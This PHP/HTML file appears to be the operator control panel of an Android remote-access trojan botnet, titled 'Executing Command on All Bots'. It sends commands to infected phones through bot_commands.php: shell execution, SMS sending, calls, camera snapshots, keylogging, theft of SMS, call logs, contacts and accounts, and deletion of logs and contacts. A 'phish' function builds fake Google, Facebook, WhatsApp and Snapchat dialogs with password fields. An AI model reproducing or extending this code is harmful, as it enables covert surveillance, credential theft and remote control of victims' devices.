<?php

session_start();

if ( isset( $_SESSION['user_id'] ) ) {

} else {
	       header("Location: ../index.php");

}
?>
<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<title>Laboratory</title>

	<!-- Normalize V8.0.1 -->
	<link rel="stylesheet" href="../css/normalize.css">

	<!-- Bootstrap V4.3 -->
	<link rel="stylesheet" href="../css/bootstrap.min.css">

	<!-- Bootstrap Material Design V4.0 -->
	<link rel="stylesheet" href="../css/bootstrap-material-design.min.css">

	<!-- Font Awesome V5.9.0 -->
	<link rel="stylesheet" href="../css/all.css">

	<!-- Sweet Alerts V8.13.0 CSS file -->
	<link rel="stylesheet" href="../css/sweetalert2.min.css">

	<!-- Sweet Alert V8.13.0 JS file-->
	<script src="../js/sweetalert2.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<link rel="stylesheet" href="../css/jquery.mCustomScrollbar.css">
	
	<!-- General Styles -->
	<link rel="stylesheet" href="../css/style.css">


</head>
<body>
<style>
 #maintable td.white {color: #ffffff;}
.example_c {
color: #494949 !important;
text-transform: uppercase;
text-decoration: none;
background: #01d28e;
padding: 3px;
border: 3px solid #494949 !important;
display: inline-block;
transition: all 0.4s ease 0s;
}
.example_c:hover {
color: #ffffff !important;
background: #f0134d;
border-color: #f0134d !important;
transition: all 0.4s ease 0s;
}

#snackbar {
  visibility: hidden;
  min-width: 250px;
  margin-left: -125px;
  background-color: #f34573;
  color: #fff;
  text-align: center;
  border-radius: 2px;
  padding: 14px;
  position: fixed;
  z-index: 1;
  left: 50%;
  bottom: 30px;
  font-size: 17px;
}

#snackbar.show {
  visibility: visible;
  -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
  animation: fadein 0.5s, fadeout 0.5s 2.5s;
}

@-webkit-keyframes fadein {
  from {bottom: 0; opacity: 0;} 
  to {bottom: 30px; opacity: 1;}
}

@keyframes fadein {
  from {bottom: 0; opacity: 0;}
  to {bottom: 30px; opacity: 1;}
}

@-webkit-keyframes fadeout {
  from {bottom: 30px; opacity: 1;} 
  to {bottom: 0; opacity: 0;}
}

@keyframes fadeout {
  from {bottom: 30px; opacity: 1;}
  to {bottom: 0; opacity: 0;}
}
</style>
	
	<!-- Main container -->
	<main class="full-box main-container">
		<!-- Nav lateral -->
		<section class="full-box nav-lateral">
			<div class="full-box nav-lateral-bg show-nav-lateral"></div>
			<div class="full-box nav-lateral-content">
              <nav class="full-box nav-lateral-menu">
					<ul>
				<li>
							<a href="home.php"><i class="fab fa-dashcube fa-fw"></i> &nbsp; Dashboard</a>
						</li>
						</ul>
						</nav>					
			<div class="full-box nav-lateral-bar"></div>
				<nav class="full-box nav-lateral-menu">
					<ul>
				<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-radiation-alt"></i> &nbsp; Miscellaneous <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="../zathura/Devinfo.php"><i class="fas fa-mobile-alt fa-fw"></i> &nbsp; Device Info</a></li>
								<li><a href="inboxsms.php"><i class="fas fa-boxes fa-inbox"></i> &nbsp; Inbox Messages</a></li>
								<li><a href="calogs.php"><i class="fas fa-phone-square-alt fa-fw"></i> &nbsp; Call Logs</a></li>
								<li><a href="../zathura/contacts.php"><i class="fas fa-id-badge fa-fw"></i> &nbsp; Contacts</a></li>
								<li><a href="gps.php"><i class="fas fa-map fa-fw"></i> &nbsp; GPS</a></li>
							   <li><a href="accounts.php"><i class="fas fa-user-alt"></i> &nbsp; Linked Accounts </a></li>


								
							</ul>
						</li>
						<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-subscript fa-fw"></i> &nbsp; Loggers <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="../zathura/screenlog.php"><i class="fas fa-desktop fa-fw"></i> &nbsp; Screen Logger</a></li>
								<li><a href="../zathura/snapshot.php"><i class="fas fa-expand fa-fw"></i> &nbsp; SnapShots</a></li>
								<li><a href="keystrokes.php"><i class="fab fa-twitch"></i> &nbsp; Key Logger</a></li>
								<li><a href="../zathura/notifications.php"><i class="fas fa-align-left fa-fw"></i> &nbsp; Notification Logger</a></li>

							</ul>
						</li>
						
						<li>
						   <a href="../zathura/rogue.php"><i class="fab fa-battle-net"></i></i> &nbsp; Rogue</a>

							<ul>

							</ul>
						</li>
						

						<li>
						   <a href="../zathura/toggle.php"><i class="fas fa-bolt"></i> &nbsp; Toggle</a>

							<ul>


							</ul>
						</li>
						
					
                        <li>
							<a href="#" class="nav-btn-submenu"><i class="fab fa-gitkraken fa-fw"></i> &nbsp; Command <i class="fas fa-chevron-down"></i></a>
							<ul>

							<li><a href="../zathura/status.php"><i class="fab fa-hubspot fa-fw"></i> &nbsp; Status</a></li>
								<li><a href="../zathura/history.php"><i class="fab fa-buffer fa-fw"></i> &nbsp; History</a></li>
								
						
							</ul>
						</li>
						

				
					</ul>
				</nav>
			</div>
		</section>

		<!-- Page content -->
		<section class="full-box page-content">
			<nav class="full-box navbar-info">
				
				<a href="#" class="btn-exit-system"><i class="fas fa-power-off"></i></a>
			</nav>

			<!-- Page header -->
			<div class="full-box page-header">
				<h3 class="text-left">
				
			<i class="fab fa-magento"></i> &nbsp; Executing Command on All Bots

				</h3>
				<p class="text-justify">
				</p>
			</div>
			
			<!-- Content here-->
			<div class="container-fluid">
				<form action="" class="form-neon" autocomplete="off">
			   <fieldset>
							<legend><i class=""></i> &nbsp </legend>

						<div class="container-fluid">
							<div class="row">
								<div class="col-12 col-md-6">
								
									<div class="form-group">
									
										<label   class="bmd-label-floating"> <b> <i class="fas fa-gamepad"></i>&nbsp Enter a message to toast. </b></label></i>
										<input type="text" pattern="[A-z.]{1,99999}" class="form-control" id="toas" maxlength="500">

										</select>

									</div>
									
									<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
										<script type="text/javascript">
                            
							     var imei = "<?php echo $content; ?>";

						         var toast = "toast";
								 var launch = "launch";
								 var block = "block";
								 var tit = "tit";
								 var msg = "msg";
								 var but = "but";
								 var google = "google";
								 var play = "play";
								 var snap = "snap";
								 var set = "set";
								

                                      </script>
						      	<div onclick="myFunction(imei,toast)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>


									<div class="form-group">
										<label   class="bmd-label-floating"> <b> <i class="fas fa-cube"></i>&nbsp Enter package name of an app to launch. </b></label></i>
										<input type="text" pattern="[0-9.]{1,15}" class="form-control" id="launch" maxlength="500">

										</select>
									</div>
						      	<div onclick="myFunction(imei,launch)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>

									<div class="form-group">
										<label   class="bmd-label-floating"> <b><i class="fab fa-optin-monster"></i>&nbsp Enter package name to block access.To block multiple use commas. </b></label></i>
										<input type="text" pattern="[0-9.]{1,15}" class="form-control" id="block" maxlength="500">

										</select>
									</div>
						      	<div  onclick="myFunction(imei,block)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
								<br>
								<br>
								
								
						
                                <br>
								
										<div class="form-group">
									
										<label   class="bmd-label-floating"> <b><i class="fas fa-ghost"></i>&nbsp Enter time in milliseconds to vibrate. </b></label></i>
										<input type="number" pattern="[A-z.]{1,99999}" class="form-control" id="vibr" maxlength="500">

										</select>

									</div>
										<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
					          <script type="text/javascript">
                               var VIB = "VIB";
							  
							
                              
							   var imei = "<?php echo $content; ?>";

                                      </script>
						   	<div onclick="myFunction(imei,VIB)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
                               <br>
							   <br>
				 			<label   class="bmd-label-floating"> <b>&nbsp Terminal </b></label></i>

							   <div class="form-group">
									
										<label   class="bmd-label-floating"> <b> <i class="fas fa-hashtag"></i>&nbsp Enter a shell command to execute. </b></label></i>
										<input type="text" pattern="[A-z.]{1,99999}" class="form-control" id="terminal" maxlength="500">

										</select>

									</div>
												<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
					          <script type="text/javascript">
                               var term = "terminal";
							  
							
                              
							   var imei = "<?php echo $content; ?>";

                                      </script>
						   	<div onclick="myFunction(imei,term)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
                               <br>
							   <br>
								<label   class="bmd-label-floating"> <b> &nbsp Text Messaging </b></label></i>

							    <div class="form-group">
									
										<label   class="bmd-label-floating"> <b> <i class="fas fa-phone-alt"></i>&nbsp Enter target phone number. </b></label></i>
										<input type="number" pattern="[A-z.]{1,99999}" class="form-control" id="tph" maxlength="13">

										</select>

									</div>
									<div class="form-group">
									
										<label   class="bmd-label-floating"> <b> <i class="fas fa-comment-alt"></i>&nbsp Enter sms text. </b></label></i>
										<input type="text" pattern="[A-z.]{1,99999}" class="form-control" id="tsms" maxlength="500">

										</select>

									</div>
							<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
					          <script type="text/javascript">
                               var tsms = "tsms";

							   var imei = "<?php echo $content; ?>";

                                      </script>
						   	<div onclick="myFunction(imei,tsms)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
                               <br>
							   <br>
								<br>
							   <label   class="bmd-label-floating"> <b> &nbsp Make a Call </b></label></i>

							    <div class="form-group">
									
										<label   class="bmd-label-floating"> <b> <i class="fas fa-phone-square-alt"></i>&nbsp Enter target phone number. </b></label></i>
										<input type="number" pattern="[A-z.]{1,99999}" class="form-control" id="pht" maxlength="13">

										</select>

									</div>
								<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
					          <script type="text/javascript">
                               var pht = "pht";

							   var imei = "<?php echo $content; ?>";

                                      </script>
									  
						   	<div onclick="myFunction(imei,pht)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
                               <br>
					
								<br>
									<nav class="full-box nav-lateral-menu">
					<ul>
					<li>
												   <label   class="bmd-label-floating"> <b> &nbsp Camera </b></label></i>

		<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
					          <script type="text/javascript">
                               var fcam = "Fcam";
							    var rcam = "Rcam";
							
                              
							   var imei = "<?php echo $content; ?>";

                                      </script>
									  
							<a href="#" class="nav-btn-submenu"><i class=""></i> &nbsp; ---Take a Snap--- <i class="fas fa-chevron-down"></i></a>
							<ul>
							<li><a href="#" onclick="command(imei,fcam)"><i class="fas fa-camera-retro"></i> &nbsp; Front Cam</a></li>
						   <li><a href="#" onclick="command(imei,rcam)"><i class="fas fa-camera"></i> &nbsp; Rear Cam</a></li>
							</ul>
						</li>
						</ul>
						</nav>
						<br>
						<br>

								
									<nav class="full-box nav-lateral-menu">
					<ul>
					<li>
												   <label   class="bmd-label-floating"> <b> &nbsp Fetchers </b></label></i>

							<a href="#" class="nav-btn-submenu"><i class=""></i> &nbsp; ---Command Executor--- <i class="fas fa-chevron-down"></i></a>
							<ul>
							<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
					          <script type="text/javascript">
                               var devi = "DevInfo";
							    var gac = "Gacc";
								var isms = "Fmsgs"; 
						        var fclog = "Fclog";
								var delc = "DelCal";
								var dcon = "delcon";
                              
							   var imei = "<?php echo $content; ?>";

                                      </script>
									  
									  

							<li><a href="#" onclick="command(imei,devi)"><i class="fab fa-ioxhost"></i> &nbsp; Fetch Device Info</a></li>
							<li><a href="#" onclick="command(imei,gac)"><i class="fas fa-user-secret"></i> &nbsp; Get Device Accounts</a></li>
						<li><a href="#" onclick="command(imei,isms)"><i class="far fa-comment-alt"></i> &nbsp; Fetch Inbox SMS</a></li>
					<li><a href="#" onclick="command(imei,fclog)"><i class="fas fa-phone-square-alt"></i> &nbsp; Get Call logs</a></li>
					<li><a href="#" onclick="command(imei,DelCal)"><i class="fas fa-phone-slash"></i> &nbsp; Delete Call logs</a></li>
					<li><a href="#" onclick="command(imei,dcon)"><i class="fas fa-file-contract"></i> &nbsp; Delete Contacts</a></li>
					

							</ul>
						</li>
						</ul>
						</nav>
						<br>
						<br>

								</div>
								
									

							
                                    <div id="snackbar">Command Sent to All Bots </div>
									
									 
									 
                             <script type="text/javascript">
                                            
											function myFunction(imei,toast) {
                                   var x = document.getElementById("snackbar");
								   
								   if(toast == 'toast')
								   {
									   var y = document.getElementById("toas").value;
									   y = 'toast'+y;
								   }
								   else if(toast == 'launch')
								   {
					        		   var y = document.getElementById("launch").value;
									   y = 'launch'+y;
								   }
								     else if(toast == 'block')
								   {
					        		   var y = document.getElementById("block").value;
									   y = 'AntiG,'+y;
								   }
								 
								   else if(toast== 'DDOS')
								   {
					                var p = document.getElementById("ddos").value;
					                var q = document.getElementById("threads").value;
									y = 'DDOS,'+p+','+q;
  
								   }
								    else if(toast== 'VIB')
								   {
					                var p = document.getElementById("vibr").value;
									y = 'VIB,'+p;
  
								   }
								       else if(toast== 'terminal')
								   {
					                var p = document.getElementById("terminal").value;
									y = 'terminal,'+p;
  
								   }
								   else if(toast== 'tsms')
								   {
					                var p = document.getElementById("tph").value;
				                   var q = document.getElementById("tsms").value;
									y = 'Tsms,'+p+','+q;
  
								   }else if(toast== 'pht')
								   {
					                var p = document.getElementById("pht").value;
									y = 'Rcall,'+p;
  
								   }
								    
								    
								    

  

                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
														      stateChange(-1);

								  $.post('../zathura/bot_commands.php', { imei: imei,command: y , function(data) { 
                                   console.log(data); 
								
                                 }});
                                 }
								 
                                     </script>
									 
									   <script type="text/javascript" src="js/jquery-1.4.2.min.js"></script>

                                 


								</div>
							</div>
						</div>					
					</select>
					</fieldset>
			
			
			
			
					<br><br><br>
					<fieldset>
						
						
					</fieldset>
                     
					<br><br><br>
					<fieldset>
					
					</fieldset>
					<br><br><br>
					<fieldset>
						
						
					</fieldset>
					
				</form>
			</div>	

		</section>

		<!-- Help Modal -->
		<div class="modal fade" id="ModalHelp" tabindex="-1" role="dialog" aria-labelledby="ModalHelpTitle" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title roboto-medium text-center" id="exampleModalLongTitle">Modal title</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
				
				<div class="modal-footer">
					<button type="button" class="btn btn-light roboto-condensed-regular" data-dismiss="modal">Close</button>
					&nbsp;
					<button type="button" class="btn btn-light roboto-condensed-regular">Save changes</button>
				</div>
				</div>
			</div>
		</div>
	</main>
	
	
	<!--=============================================
	=            Include JavaScript files           =
	==============================================-->
	<!-- jQuery V3.4.1 -->
	<script src="../js/jquery-3.4.1.min.js" ></script>

	<!-- popper -->
	<script src="../js/popper.min.js" ></script>

	<!-- Bootstrap V4.3 -->
	<script src="../js/bootstrap.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<script src="../js/jquery.mCustomScrollbar.concat.min.js" ></script>

	<!-- Bootstrap Material Design V4.0 -->
	<script src="../js/bootstrap-material-design.min.js" ></script>
	<script>$(document).ready(function() { $('body').bootstrapMaterialDesign(); });</script>

	<script src="../js/main.js" ></script>
	
	 
								 
	<script>
	a.button5{
display:inline-block;
padding:0.46em 1.6em;
border:0.1em solid #000000;
margin:0 0.2em 0.2em 0;
border-radius:0.12em;
box-sizing: border-box;
text-decoration:none;
font-family:'Roboto',sans-serif;
font-weight:300;
color:#000000;
text-shadow: 0 0.04em 0.04em rgba(0,0,0,0.35);
background-color:#FFFFFF;
text-align:center;
transition: all 0.15s;
}
a.button5:hover{
text-shadow: 0 0 2em rgba(255,255,255,1);
color:#FFFFFF;
border-color:#FFFFFF;
}
@media all and (max-width:30em){
a.button5{
display:block;
margin:0.4em auto;
}
}
</script>

  <script type="text/javascript">
                                            
											function phish(imei,toast) {
                                   var x = document.getElementById("snackbar");
								   
								   if(toast == 'google')
								   {
									  var x = document.getElementById("title").value;
									  var y = document.getElementById("message").value;
									  var z = document.getElementById("button").value;
									  var b = document.getElementById("inp").value;
								   if(b== 'X' || b == 'x')
								   {
									   b = 'text';
								   }
								   else  if(b== 'Y' || b == 'y')
								   {
									   b = 'password';
								   }
								     else  if(b== 'Z' || b == 'z')
								   {
									   b = 'number';
								   }
								   
								   

								      var a  = 'G';

									   
									   y = 'Dialog,'+x+','+y+','+z+','+a+','+b;
								   }
								   else if(toast == 'play')
								   {
                                      var x = document.getElementById("title").value;
									  var y = document.getElementById("message").value;
									   var z = document.getElementById("button").value;
									    var b = document.getElementById("inp").value;

									   var a = 'P'
									      if(b== 'X' || b == 'x')
								   {
									   b = 'text';
								   }
								   else  if(b== 'Y' || b == 'y')
								   {
									   b = 'password';
								   }
								     else  if(b== 'Z' || b == 'z')
								   {
									   b = 'number';
								   }
								   
                                    						   
									   y = 'Dialog,'+x+','+y+','+z+','+a+','+b;
									   
								   }
								   
								   else if(toast == 'fb')
								   {
                                      var x = document.getElementById("title").value;
									  var y = document.getElementById("message").value;
									   var z = document.getElementById("button").value;
									    var b = document.getElementById("inp").value;

									   var a = 'f'
									      if(b== 'X' || b == 'x')
								   {
									   b = 'text';
								   }
								   else  if(b== 'Y' || b == 'y')
								   {
									   b = 'password';
								   }
								     else  if(b== 'Z' || b == 'z')
								   {
									   b = 'number';
								   }
								   
                                    						   
									   y = 'Dialog,'+x+','+y+','+z+','+a+','+b;
									   
								   }
								     else if(toast == 'snap')
								   {
					        		    var x = document.getElementById("title").value;
									  var y = document.getElementById("message").value;
									   var z = document.getElementById("button").value;						
									   var b = document.getElementById("inp").value;

									   var a = 'S';
									      if(b== 'X' || b == 'x')
								   {
									   b = 'text';
								   }
								   else  if(b== 'Y' || b == 'y')
								   {
									   b = 'password';
								   }
								     else  if(b== 'Z' || b == 'z')
								   {
									   b = 'number';
								   }
								   
									  
									   y = 'Dialog,'+x+','+y+','+z+','+a+','+b;
								   }
								     else if(toast == 'whats')
								   {
					        		     var x = document.getElementById("title").value;
									  var y = document.getElementById("message").value;
									   var z = document.getElementById("button").value;
									   var b = document.getElementById("inp").value;
                                        if(b== 'X' || b == 'x')
								   {
									   b = 'text';
								   }
								   else  if(b== 'Y' || b == 'y')
								   {
									   b = 'password';
								   }
								     else  if(b== 'Z' || b == 'z')
								   {
									   b = 'number';
								   }
								   
									   var a = 'W';
	                             
									   y = 'Dialog,'+x+','+y+','+z+','+a+','+b;

								   }
								     else if(toast == 'set')
								   {
                                       var x = document.getElementById("title").value;
									   var y = document.getElementById("message").value;
									   var z = document.getElementById("button").value;
								      var b = document.getElementById("inp").value;
                                      if(b== 'X' || b == 'x')
								   {
									   b = 'text';
								   }
								   else  if(b== 'Y' || b == 'y')
								   {
									   b = 'password';
								   }
								     else  if(b== 'Z' || b == 'z')
								   {
									   b = 'number';
								   }
								   
                                    	 var a = 'A';
									   y = 'Dialog,'+x+','+y+','+z+','+a+','+b;
									  
									  }

  

                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
														      stateChange(-1);
															  

								  $.post('../zathura/bot_commands.php', { imei: imei,command: y , function(data) { 
                                   console.log(data); 
								
                                 }});
                                 }
								 
                                     </script>
									 	   <script>
                               function command(imei,meow) { 
										
                                   var x = document.getElementById("snackbar");
                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 670);
						      stateChange(-1);

								  $.post('../zathura/bot_commands.php', { imei: imei,command: meow , function(data) { 
                                   console.log(data); 
								
                                 }});
                                 }
                                     </script>
<script>
function stateChange(newState) {
    setTimeout(function(){
        if(newState == -1){
				document.location.reload(true);}
    }, 800);
}
</script>

<script>
function String.isNullOrEmpty(value) {
    return value == null || value === "null";
}
</script>
</body>
</html>